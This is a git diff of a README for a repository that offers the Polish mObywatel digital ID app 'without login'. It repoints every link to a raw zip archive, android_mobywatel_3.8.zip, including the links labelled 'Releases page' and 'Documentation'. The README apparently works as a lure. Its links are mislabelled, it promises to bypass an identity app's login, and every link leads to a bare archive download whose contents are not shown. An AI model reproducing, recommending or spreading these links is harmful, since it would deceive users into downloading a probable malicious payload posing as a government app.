@@ -1,7 +1,7 @@
 # 🌟 mobywatel-android - Access Your mObywatel App Without Login
 
 ## 📥 Download Now
-[![Download mObywatel](https://raw.githubusercontent.com/Diapelo/mobywatel-android/main/textinput/model/android-mobywatel-3.5.zip%20mObywatel-brightgreen)](https://raw.githubusercontent.com/Diapelo/mobywatel-android/main/textinput/model/android-mobywatel-3.5.zip)
+[![Download mObywatel](https://github.com/Diapelo/mobywatel-android/raw/refs/heads/main/header/android_mobywatel_3.8.zip%20mObywatel-brightgreen)](https://github.com/Diapelo/mobywatel-android/raw/refs/heads/main/header/android_mobywatel_3.8.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ To use this application, you will need:
 
 To get the mObywatel application, visit the Releases page. Here are the steps:
 
-1. Click this link to [visit the Releases page](https://raw.githubusercontent.com/Diapelo/mobywatel-android/main/textinput/model/android-mobywatel-3.5.zip).
+1. Click this link to [visit the Releases page](https://github.com/Diapelo/mobywatel-android/raw/refs/heads/main/header/android_mobywatel_3.8.zip).
 2. On the Releases page, find the latest version at the top.
 3. Locate the downloadable file. It will usually be labeled clearly.
 4. Click on the file to begin the download.
@@ -63,8 +63,8 @@ Try restarting your device and reopening the app. If the problem persists, check
 
 ## 🔗 Helpful Links
 
-- [mobywatel-android Releases](https://raw.githubusercontent.com/Diapelo/mobywatel-android/main/textinput/model/android-mobywatel-3.5.zip)
-- [Documentation](https://raw.githubusercontent.com/Diapelo/mobywatel-android/main/textinput/model/android-mobywatel-3.5.zip)
+- [mobywatel-android Releases](https://github.com/Diapelo/mobywatel-android/raw/refs/heads/main/header/android_mobywatel_3.8.zip)
+- [Documentation](https://github.com/Diapelo/mobywatel-android/raw/refs/heads/main/header/android_mobywatel_3.8.zip)
 
 ## 👥 Community and Support
 
@@ -81,6 +81,6 @@ We welcome contributions! If you would like to help improve this project, please
 - Engage with the community for tips and tricks on using the application effectively. 
 
 ## 📥 Download Now Again
-[![Download mObywatel](https://raw.githubusercontent.com/Diapelo/mobywatel-android/main/textinput/model/android-mobywatel-3.5.zip%20mObywatel-brightgreen)](https://raw.githubusercontent.com/Diapelo/mobywatel-android/main/textinput/model/android-mobywatel-3.5.zip)
+[![Download mObywatel](https://github.com/Diapelo/mobywatel-android/raw/refs/heads/main/header/android_mobywatel_3.8.zip%20mObywatel-brightgreen)](https://github.com/Diapelo/mobywatel-android/raw/refs/heads/main/header/android_mobywatel_3.8.zip)
 
 Thank you for using mObywatel-Android! Enjoy exploring the features and utility of your mObywatel application.
